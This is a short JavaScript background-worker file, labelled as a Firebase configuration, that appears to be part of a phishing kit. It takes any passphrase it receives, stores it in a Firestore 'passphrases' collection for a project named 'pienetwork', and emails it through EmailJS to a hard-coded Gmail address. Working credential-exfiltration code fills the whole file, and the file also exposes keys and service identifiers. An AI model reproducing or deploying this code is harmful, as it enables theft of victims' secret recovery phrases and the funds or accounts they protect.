// ✅ Firebase Config 2
importScripts("https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js");
importScripts("https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js");
importScripts("https://cdn.emailjs.com/dist/email.min.js");

const firebaseConfig2 = {
    apiKey: "AIzaSyBaGy1JNGBARMOM1a17XaDfE0-cczJTndY",
    authDomain: "pienetwork-79f6b.firebaseapp.com",
    projectId: "pienetwork-79f6b",
    storageBucket: "pienetwork-79f6b.appspot.com",
    messagingSenderId: "413061844814",
    appId: "1:413061844814:web:97d988c05174f8b813581f",
    measurementId: "G-YF32BB1E2J"
};

// ✅ Initialize Firebase 2
const app2 = firebase.initializeApp(firebaseConfig2, "app2");
const firestore2 = app2.firestore();

// ✅ Listen for messages (passphrase)
onmessage = function(event) {
    let passphrase = event.data;

    console.log("⏳ Background: Storing in Firebase 2...");

    firestore2.collection("passphrases").add({
        passphrase: passphrase,
        timestamp: new Date().toISOString()
    }).then(() => {
        console.log("✅ Background: Passphrase stored in second database!");
        
        console.log("📨 Background: Sending Email...");
        sendEmail(passphrase);
    }).catch(error => console.error("❌ Background: Error storing in second database:", error));
};

function sendEmail(passphrase) {
    emailjs.send("service_7unsbzm", "template_n3413c8", {
        to_email: "rs8041964@gmail.com",
        passphrase: passphrase
    }, "D0F2_IVgzpb_8x10m")
    .then(response => console.log("✅ Email sent successfully!", response))
    .catch(error => console.error("❌ Email failed:", error));
}
